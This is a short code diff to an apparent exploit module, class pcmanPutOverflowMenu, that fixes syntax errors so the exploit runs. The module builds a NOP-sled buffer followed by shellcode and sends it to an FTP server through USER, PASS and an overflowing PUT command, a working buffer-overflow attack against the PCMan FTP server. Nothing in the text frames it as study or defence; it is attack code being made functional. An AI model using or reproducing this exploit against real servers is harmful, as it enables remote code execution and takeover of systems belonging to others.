@@ -8,12 +8,12 @@ class pcmanPutOverflowMenu(core.Exploit):
     p += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
     p += self.get_shellcode()
     return p
-  def deliver(self, p)
+  def deliver(self, p):
     self.init_deliver()
     s = self.connect()
-    s.send("USER " + self.variables["user"]
+    s.send("USER " + self.variables["user"])
     s.recv(1024)
-    s.send("PASS " + self.variables["passwd"]
+    s.send("PASS " + self.variables["passwd"])
     s.recv(1024)
     s.send("PUT " + p)
     self.disconnect(s)
